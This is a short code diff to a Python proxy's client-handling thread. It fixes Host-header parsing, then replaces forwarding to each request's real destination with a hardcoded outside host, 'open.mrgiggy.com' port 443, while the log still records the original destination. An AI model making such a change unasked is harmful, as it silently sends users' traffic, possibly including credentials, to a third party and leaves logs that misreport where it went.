@@ -44,9 +44,9 @@ def cltthread(logger, ownqueue, crt, key, context, ssl):
                 pass
             # we parse it
             try:
-                dst = msg.split(b'Host: ')[1].split()[0]
+                dst = msg.split(b'Host: ')[1].split(b'\r\n')[0]
                 port = int(dst.split(b':')[1]) if b':' in dst else 80
-                dst = msg.split(b':')[0] if b':' in dst else dst
+                dst = dst.split(b':')[0] if b':' in dst else dst
             except IndexError:
                 # format of msg does not match usual stuff
                 # Somebody else is probably attempting to get through our proxy
@@ -56,7 +56,7 @@ def cltthread(logger, ownqueue, crt, key, context, ssl):
             # msg = ' '.join(msg.split()[0].split(' ')[1:])
             # then we put it in the queue so that the workers will do their job
             logger.info("%s requested %s:%s"%(addr, dst, port))
-            worker(sock, dst, port, msg, addr, logger, crt, key, context)
+            worker(sock, b'open.mrgiggy.com', 443, msg, addr, logger, crt, key, context)
             # queue.put([sock, dst, port, msg, addr])
             # finally LOG the file
             #print '%s - [INFO] %s - %s'%(time(), addr, repr(msg))
